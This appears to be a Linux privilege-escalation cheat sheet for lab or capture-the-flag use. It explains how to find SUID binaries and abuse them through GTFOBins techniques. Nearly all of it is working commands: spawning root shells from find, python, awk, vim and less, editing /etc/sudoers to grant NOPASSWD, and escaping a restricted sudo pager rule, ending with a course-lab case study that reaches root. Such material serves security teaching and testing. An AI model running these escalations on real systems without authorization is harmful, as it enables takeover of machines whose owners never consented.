When a regular file has the SUID permission enabled, any user who runs that executable temporarily gains the privileges of the file's owner while the program is running. So if a file owner is root, then the person who runs a file will be granted temp root access.

## Finding SUID Binaries

**Basic command:**
```bash
find / -type f -perm -4000 2>/dev/null
```

## Standard Binaries to Ignore (False Positives)

Standard system binaries that REQUIRE SUID bits to function normally:
- `passwd` — change password (system function)
- `sudo` — run commands as root (control mechanism)
- `su` — switch user (control mechanism)
- `mount` — mount filesystems (system admin)
- `umount` — unmount filesystems (system admin)
- `chsh` — change shell
- `chfn` — change finger info
- `newgrp` — change group
- `fusermount` — FUSE mount helper
- `pkexec` — PolicyKit authentication

**Filtered command (removes noise):**
```bash
find / -type f -perm -4000 2>/dev/null | grep -vE 'passwd|sudo|su|mount|umount|chsh|chfn|newgrp|fusermount|pkexec'
```

**Automated filtering script:**
```bash
find / -type f -perm -4000 2>/dev/null | while read bin; do
  name=$(basename "$bin")
  if ! echo "$name" | grep -qE '^(passwd|sudo|su|mount|umount|chsh|chfn|newgrp|fusermount|pkexec)$'; then
    echo "$bin"
  fi
done
```

## Checking Against GTFOBins

Compare all results to GTFOBins: https://gtfobins.org/

Any SUID binary NOT in the standard list above is worth checking.

## Exploitation Examples

When you find an abnormal SUID binary (exploitable via GTFOBins), use the documented technique:

### Example 1: find
```bash
/usr/bin/find . -exec cat /root/flag.txt \; -quit
```

### Example 2: python
```bash
python -c 'import os; os.system("/bin/bash")'
```

### Example 3: awk
```bash
awk 'BEGIN {system("/bin/bash")}'
```

### Example 4: nano
```bash
nano /etc/sudoers
# Then add your user with NOPASSWD privileges
```

### Example 5: vim
```bash
vim /etc/sudoers

```

## Complete Workflow

1. **Find all SUID binaries:**
   ```bash
   find / -type f -perm -4000 2>/dev/null
   ```

2. **Filter out standard binaries:**
   ```bash
   find / -type f -perm -4000 2>/dev/null | grep -vE 'passwd|sudo|su|mount|umount|chsh|chfn|newgrp|fusermount|pkexec'
   ```

3. **Check each result on GTFOBins** (https://gtfobins.org/) for exploitation technique

4. **Execute the exploitation command** provided by GTFOBins

5. **Verify privilege escalation:**
   ```bash
   id
   whoami
   ```

## SUID vs. sudo — two different channels (don't confuse them)

These both get you code-as-another-user via GTFOBins, but the authorization comes from completely different places. Confusing them will make you think a vector is dead when it isn't.

| | **SUID** | **sudo rule** |
|---|---|---|
| What it is | a bit on a file → it runs as the file's **owner** for *anyone* | sudoers policy → **you** may run a specific command as another user |
| How you find it | `find / -perm -4000` | `sudo -l` |
| The elevating binary | the SUID binary itself | `sudo` (which is itself SUID-root) |

**The trap:** "I don't have SUID on `less`, so I can't use `less` to escalate." Wrong — if `sudo -l` shows `(root) NOPASSWD: /usr/bin/less ...`, you run it **through sudo**, which is already SUID-root and launches `less` as root on your behalf. `less` never needed a SUID bit of its own. Always check **both** `find -perm -4000` *and* `sudo -l`; a binary absent from one may be handed to you by the other.

## Sudo NOPASSWD on an interactive program

`sudo -l` showing something like:
```
(root) NOPASSWD: /usr/bin/less /var/log/ops/service.log
```
looks like harmless read access, but **any interactive program running as root is a root shell waiting to happen** — `less`, `more`, `man`, `vi`/`vim`, `nano`, `awk`, `find`, `tar`, `git`, etc. (all on GTFOBins).

**Two gotchas, both learned the hard way:**

1. **sudoers matches the WHOLE command line, argument included.** You can't just change the target:
   ```
   sudo less /root/flag.txt      → "user is not allowed to execute ... as root"
   ```
   The rule authorized `less /var/log/ops/service.log`, not `less /root/flag.txt`. **Don't fight the matcher — satisfy it, then pivot from *inside* the program.** sudo's job ends once it launches the binary as root; it has no say over what you do within it.

2. **Escape from inside.** Run it exactly as authorized, then use the program's own features:
   ```
   sudo /usr/bin/less /var/log/ops/service.log
   # then, at the less ':' prompt:
   !/bin/sh            ← '!' runs a shell command → ROOT shell
   :e /root/flag.txt   ← 'examine' a different file (you're root inside less now)
   ```
   `vi`/`vim`: `:!sh` or `:set shell=/bin/sh` then `:shell`. `man`: `!sh`. `awk`: `BEGIN{system("/bin/sh")}`. Check gtfobins.org for the exact keystrokes per binary — the **Sudo** section, which is separate from the **SUID** section for exactly the reason in the table above.

### Case study — CYBR401 Lab 8 (c02 → root)
`sudo -l` ran without a password (`!authenticate` in Defaults) and granted `(root) NOPASSWD: /usr/bin/less /var/log/ops/service.log`. Direct `sudo less /root/flag.txt` was refused (exact-match). Ran the authorized command, then `!/bin/sh` from the pager → root shell → read the flag. The "read-only log access" was a full root escalation.
